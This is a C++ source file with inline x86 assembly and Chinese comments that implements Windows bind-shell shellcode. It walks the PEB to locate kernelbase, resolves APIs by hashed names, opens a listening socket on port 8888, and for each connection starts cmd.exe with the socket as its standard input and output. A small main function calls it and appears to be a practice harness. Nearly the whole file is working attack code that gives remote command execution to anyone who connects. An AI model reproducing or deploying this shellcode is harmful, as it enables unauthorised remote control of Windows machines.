#include <iostream>

void __declspec(naked) AsmBindShellCode()
{
	__asm
	{
		push ebp
		pushad
		sub ebp, 0x1000
		sub esp, 0x1000
		mov ebp, esp

		sub esp, 0x500 // 分配参数空间 500个字节  先同时提升ebp和esp的空间 
		// 字符串
		// ws2_32.dll  77 73 32 5F  33 32 2E 64  6C 6C 00    长度0x0A
		// cmd.exe  63 6D 64 2E  65 78 65 00    长度0x8
		// KERNELBASE.dll 84871AB2
		// LoadLibraryExA C0D83287

		// 参数空间
		/*

		-500 暂给WSADATA使用一下

		-190 STARTUPINFOA 68 0x44

		-100 PROCESS_INFORMATION 16 0x10
	
		-44 存放 CloseHandle 函数地址
		-40 存放新的socket
		-3c 存放 CreateProcessA 函数地址
		-38 存放 accept 函数地址
		-34  SOCKADDR_IN 16个字节

		-24 SOCKET
		-20 ws2_32模块基址
		-1c 字符串 cmd.exe

		-14 字符串 ws2_32.dll

		-8 LoadLibraryExA 函数地址
		-4 kernelbase 模块基址
		*/

		// 保存字符串
		mov dword ptr[ebp - 0x0c], 0x6c6c
		mov dword ptr[ebp - 0x10], 0x642e3233
		mov dword ptr[ebp - 0x14], 0x5f327377

		mov dword ptr[ebp - 0x18], 0x657865
		mov dword ptr[ebp - 0x1C], 0x2e646d63

		// 获取KERNELBASE.dll的模块基址
		call func_get_kernelbase_dll
		mov[ebp - 0x4], eax // 存放模块基址 

		// 获取 LoadLibraryExA 函数地址
		push 0xC0D83287
		push [ebp - 0x4]
		call func_GetProcAddress
		mov[ebp - 0x8], eax

		// 加载 ws2_32.dll
		push 0x8
		push 0
		lea esi, [ebp - 0x14]
		push esi
		call [ebp - 0x8]
		mov [ebp - 0x20], eax  // ws2_32模块基址

		//////////////start 
		// 获取 WSAStartup 函数地址  80B46A3D
		push 0x80B46A3D
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress
		// 调用 WSAStartup
		lea esi, [ebp - 0x500]
		push esi
		push 0x0202
		call eax

		// 获取 WSASocketA 函数地址 DE78322D
		push 0xDE78322D
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress
		// 调用 WSASocketA
		push 0
		push 0
		push 0
		push 0x6
		push 0x1
		push 0x2
		call eax
		mov [ebp - 0x24], eax // 存放socket

		// SOCKADDR_IN 初始化 -34 
		mov  word ptr[ebp - 0x34], 0x2
		mov  word ptr[ebp - 0x32], 0xB822
		mov  dword ptr [ebp - 0x30], 0
		// 获取bind bind DDA71064
		push 0xDDA71064
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress

		push 0x10
		lea esi, [ebp - 0x34]
		push esi
		push [ebp - 0x24] // socket
		call eax

		// 调用listen  4BD39F0C
		push 0x4BD39F0C
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress

		push 0x10
		push [ebp - 0x24] // socket
		call eax

		// accept 1971EB1
		push 0x01971EB1
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress
		mov [ebp - 0x38], eax // 存放accept 函数地址

		push 0x6BA6BCC9
		push dword ptr[ebp - 0x4] // kernelbase
		call func_GetProcAddress
		mov[ebp - 0x3C], eax // 存放 CreateProcessA 函数地址  6BA6BCC9

		push 0xFF0D6657
		push dword ptr[ebp - 0x4] // kernelbase
		call func_GetProcAddress
		mov[ebp - 0x44], eax // 存放 CloseHandle  函数地址  FF0D6657
			
		//- 44 存放 CloseHandle 函数地址
		//- 40 存放新的socket
		//- 3c 存放 CreateProcessA 函数地址
		//- 38 存放 accept 函数地址
	tag_loop_Socket_start:

		// accept
		push 0
		push 0
		push [ebp - 0x24]
		call [ebp - 0x38]
		mov [ebp - 0x40],eax  // 存放新的socket

		//- 190 STARTUPINFOA 68 0x44
		//- 4c PROCESS_INFORMATION 16 0x10
		// 初始化结构体 STARTUPINFOA
		lea edi, [ebp - 0x100]
		xor eax, eax
		mov ecx, 0x4
		cld
		rep stosd

		lea edi,[ebp-0x190]
		xor eax,eax
		mov ecx,0x11
		cld
		rep stosd

		mov dword ptr[ebp - 0x190], 0x44
		mov dword ptr[ebp - 0x164], 0x100
		mov word ptr[ebp - 0x160], 0x0
		mov esi, [ebp - 0x40] // 新的socket
		mov dword ptr[ebp - 0x158], esi
		mov dword ptr[ebp - 0x154], esi
		mov dword ptr[ebp - 0x150], esi

		// CreateProcessA  [ebp - 0x3C]
		lea edi, [ebp - 0x100]
		push edi  // PROCESS_INFORMATION
		lea edi, [ebp - 0x190]
		push edi // STARTUPINFOA
		push 0
		push 0
		push 0
		push 1
		push 0
		push 0
		lea edi, [ebp - 0x1C] // cmd.exe
		push edi
		push 0
		call [ebp - 0x3C]

		// close handle
		push dword ptr[ebp - 0x100]
		call [ebp - 0x44]
		push dword ptr [ebp - 0x0FC]
		call [ebp - 0x44]
		jmp tag_loop_Socket_start
		//////////////////////////////////

		mov esp, ebp
		popad
		pop ebp
		retn
		// func_GetProcAddress 解析pe, 获取函数指针 start=====
		// 参数1 imageBase 模块基址 
		// 参数2 funcName  函数名称 hash后的名称
	func_GetProcAddress:
			push ebp
			mov ebp, esp
			sub esp, 0x1c // 分配参数空间

			push ebx
			push ecx
			push edx
			push esi

			// 解析pe -- 找到数据目录表位置 -- 第一个为导出表
			mov edx, [ebp + 0x8] // 第一个参数 模块基址
			mov esi, [edx + 0x3c] // if_new
			lea esi, [esi + edx] // nt头
			mov esi, [esi + 0x78] // 数据目录表rva 即 DataDirectory字段所在位置
			lea esi, [esi + edx] // 数据目录表va
			// 遍历三个数组
			mov edi, [esi + 0x1c] // EAT 导出地址表 rva
			lea edi, [edi + edx] // EAT va
			mov[ebp - 0x4], edi // 存到局部变量
			mov edi, [esi + 0x20] // ENT 导出名称表 rva
			lea edi, [edi + edx] // ENT va
			mov[ebp - 0x8], edi // 存到局部变量
			mov edi, [esi + 0x24] // EOT 导出序号表 rva
			lea edi, [edi + edx] // EOT va
			mov[ebp - 0x0C], edi // 存到局部变量

			// 循环和传入的名称相比较
			xor ecx, ecx
		func_GetProcAddress_getAddr_loop :
			mov esi, [ebp - 0x8] // ENT
			mov esi, [esi + ecx * 4] // rva
			lea esi, [edx + esi] // 函数名称字符串地址
			// 计算hash char
			push esi
			call func_compute_hash
			cmp eax, [ebp + 0x0c] // 和传入的函数名称比较 
			je func_GetProcAddress_getAddr_loop_end
			inc ecx
			jmp func_GetProcAddress_getAddr_loop
			func_GetProcAddress_getAddr_loop_end :
			// 从序号表和地址表拿到地址
			mov esi, [ebp - 0x0c] // EOT
			xor edi, edi
			mov di, [esi + ecx * 2] // EAT 表索引
			mov ebx, [ebp - 0x4] // EAT
			mov esi, [ebx + edi * 4] // 函数地址rva
			lea eax, [esi + edx]  // func addr

			pop esi
			pop edx
			pop ecx
			pop ebx

			mov esp, ebp
			pop ebp
			retn 0x8
			// func_GetProcAddress 解析pe 获取函数指针 end=====



		

			// func_compute_hash 计算char*字符串的hash函数 start====stdcall
			// 参数1: 字符串首地址
		func_compute_hash: // 接收一个字符串地址 stdcall
		push ebp
			mov ebp, esp

			sub esp, 0x4 // 分配四字节空间
			mov dword ptr[ebp - 0x4], 0

			push ebx
			push ecx
			push edx
			push esi

			mov esi, [ebp + 0x08] // 参数的地址, 即字符串地址
			// 用[ebp-0x4]存放digest  ecx 存放循环index 
			xor ecx, ecx
			xor edx, edx
			xor ebx, ebx
			tag_loop_start : // eax 的al存放字节  ebx edx存放中间变量
		xor eax, eax
			mov al, [esi + ecx]
			test al, al
			jz end_func_compute_hash    // 比较是否到字符串结尾
			mov ebx, dword ptr[ebp - 0x4]
			mov edx, dword ptr[ebp - 0x4]
			shl edx, 25
			shr ebx, 7
			or edx, ebx
			add edx, eax
			inc ecx
			mov dword ptr[ebp - 0x4], edx
			jmp tag_loop_start
			end_func_compute_hash :
			pop esi
			pop edx
			pop ecx
			pop ebx

			mov eax, [ebp - 0x4]
			mov esp, ebp
			pop ebp
			retn 0x4
		// func_compute_hash 计算char*字符串的hash函数 end====stdcall
		// 
		// func_compute_hash_wchar 计算wchar_t字符串的hash函数 start====stdcall
		// 参数1: 字符串首地址
		// 

			// func_get_kernelbase_dll 获取dll的模块基址 start=====
			//  参数1: dll名称的hash值 DWORD
			func_get_kernelbase_dll: //
			push ebp
			mov ebp, esp
			sub esp, 0x4 // 分配参数空间

			push ebx
			push ecx
			push edx
			push esi
			
			mov esi, fs: [0x30] // PEB
			mov esi, [esi + 0x0c] // LDR结构体指针
			mov esi, [esi + 0x1c] // list
			// 开始遍历列表 从第二项开始 第一个是ntdll
			func_getDll_BaseAddr_getmodule :
			mov esi, [esi]
			mov ebx, [esi + 0x20] // dll的名称 wchar
			// 计算dll名称的hash值  	push 0x84871AB2
			push ebx
			call func_compute_hash_wchar
			cmp eax, 0x84871AB2 // 拿dll名称的hash和传入的第一个参数比较
			je func_getDll_BaseAddr_end
			jmp func_getDll_BaseAddr_getmodule
			func_getDll_BaseAddr_end :
			mov eax, [esi + 0x08] // dll的模块基址

			pop esi
			pop edx
			pop ecx
			pop ebx

			mov esp, ebp
			pop ebp
			retn 0x4
			// func_getDll_BaseAddr 获取dll的模块基址 end=====
		func_compute_hash_wchar:
			push ebp
			mov ebp, esp
			push ecx
			mov dword ptr ss : [ebp - 0x4] , 0x0
			func_compute_hash_wchar_tag1 :
			mov eax, dword ptr ss : [ebp + 0x8]
			movzx ecx, word ptr ds : [eax]
			test ecx, ecx
			je func_compute_hash_wchar_tag_end
			mov edx, dword ptr ss : [ebp - 0x4]
			shl edx, 0x19
			mov eax, dword ptr ss : [ebp - 0x4]
			shr eax, 0x7
			or edx, eax
			mov dword ptr ss : [ebp - 0x4] , edx
			mov ecx, dword ptr ss : [ebp + 0x8]
			movzx edx, word ptr ds : [ecx]
			add edx, dword ptr ss : [ebp - 0x4]
			mov dword ptr ss : [ebp - 0x4] , edx
			mov eax, dword ptr ss : [ebp + 0x8]
			add eax, 0x2
			mov dword ptr ss : [ebp + 0x8] , eax
			jmp func_compute_hash_wchar_tag1
			func_compute_hash_wchar_tag_end :
			mov eax, dword ptr ss : [ebp - 0x4]
			mov esp, ebp
			pop ebp
			retn 0x4
		// func_compute_hash_wchar 计算wchar_t字符串的hash函数 end======stdcall
		/////////////////////////////////


	}
}

int mainA33()
{
	printf("helloworld\n");
	AsmBindShellCode();
	printf("end\n");
	return 0;
}